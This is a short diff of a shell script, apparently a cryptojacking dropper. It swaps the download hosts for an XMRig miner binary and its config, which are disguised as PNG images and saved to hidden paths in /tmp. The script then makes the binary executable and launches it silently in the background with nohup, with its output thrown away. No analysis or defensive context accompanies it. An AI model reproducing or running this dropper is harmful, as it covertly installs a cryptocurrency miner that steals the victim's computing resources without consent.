@@ -1,4 +1,4 @@
-curl https://imgkr.cn-bj.ufileos.com/9fc978e6-77e7-44ef-98c3-78ac5628ee30.png -o /tmp/.xmrig
-curl https://imgkr.cn-bj.ufileos.com/bc85e2c7-8c42-4e55-9461-fa243a20b02f.png -o /tmp/config.json
+curl https://github.com/m11001alpha/helloworld/raw/master/xmrig.png -o /tmp/.xmrig
+curl https://raw.githubusercontent.com/m11001alpha/helloworld/master/config.json.png -o /tmp/config.json
 chmod 744 /tmp/.xmrig
 nohup /tmp/.xmrig >/dev/null 2>&1 &
